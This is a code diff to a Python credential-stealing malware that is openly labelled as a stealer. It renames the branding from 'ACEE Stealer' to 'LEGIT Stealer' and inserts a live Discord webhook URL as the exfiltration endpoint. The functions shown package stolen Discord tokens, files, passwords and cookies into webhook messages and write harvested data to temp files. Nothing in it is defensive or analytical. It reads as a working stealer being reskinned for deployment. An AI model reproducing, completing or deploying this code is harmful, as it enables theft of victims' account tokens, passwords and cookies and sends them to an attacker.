@@ -20,7 +20,7 @@ import subprocess
 #
 
 
-hook = ""
+hook = "https://discordapp.com/api/webhooks/1322637866567733288/KUBhdeRcSNOUSU8WAmdHfJTyMU652tqHWOmhe-FKKMF5vppL0YUY3S-5H0tNl-cS7Dvx"
 DETECTED = False
 
 
@@ -274,7 +274,7 @@ def uploadToken(token, path):
                 "icon_url": f"{pfp}"
                 },
             "footer": {
-                "text": "@ACEE STEALER",
+                "text": "@LEGIT STEALER",
                 "icon_url": "https://cdn.discordapp.com/attachments/971769033496076348/1018558042402476143/manny_in_floatie.jpg"
                 },
             "thumbnail": {
@@ -283,7 +283,7 @@ def uploadToken(token, path):
             }
         ],
         "avatar_url": "https://cdn.discordapp.com/attachments/971769033496076348/1018558042402476143/manny_in_floatie.jpg",
-        "username": "ACEE Stealer",
+        "username": "LEGIT Stealer",
         "attachments": []
         }
     # urlopen(Request(hook, data=dumps(data).encode(), headers=headers))
@@ -315,10 +315,10 @@ def upload(name, tk=''):
                 }
             ],
             "author": {
-                "name": "ACEE | File Stealer"
+                "name": "Legit | File Stealer"
             },
             "footer": {
-                "text": "@ACEE STEALER",
+                "text": "@LEGIT STEALER",
                 "icon_url": "https://cdn.discordapp.com/attachments/971769033496076348/1018558042402476143/manny_in_floatie.jpg"
             }
             }
@@ -354,10 +354,10 @@ def upload(name, tk=''):
                 }
             ],
             "author": {
-                "name": "ACEE | Password Stealer"
+                "name": "Legit | Password Stealer"
             },
             "footer": {
-                "text": "@ACEE STEALER",
+                "text": "@LEGIT STEALER",
                 "icon_url": "https://cdn.discordapp.com/attachments/963114349877162004/992245751247806515/unknown.png"
             }
             }
@@ -386,10 +386,10 @@ def upload(name, tk=''):
                 }
             ],
             "author": {
-                "name": "ACEE | Cookies Stealer"
+                "name": "Legit | Cookies Stealer"
             },
             "footer": {
-                "text": "@ACEE STEALER",
+                "text": "@LEGIT STEALER",
                 "icon_url": "https://cdn.discordapp.com/attachments/963114349877162004/992245751247806515/unknown.png"
             }
             }
@@ -406,7 +406,7 @@ def upload(name, tk=''):
 def writeforfile(data, name):
     path = os.getenv("TEMP") + f"\wp{name}.txt"
     with open(path, mode='w', encoding='utf-8') as f:
-        f.write(f"<--ACEE STEALER ON TOP-->\n\n")
+        f.write(f"<--LEGIT STEALER ON TOP-->\n\n")
         for line in data:
             if line[0] != '':
                 f.write(f"{line}\n")
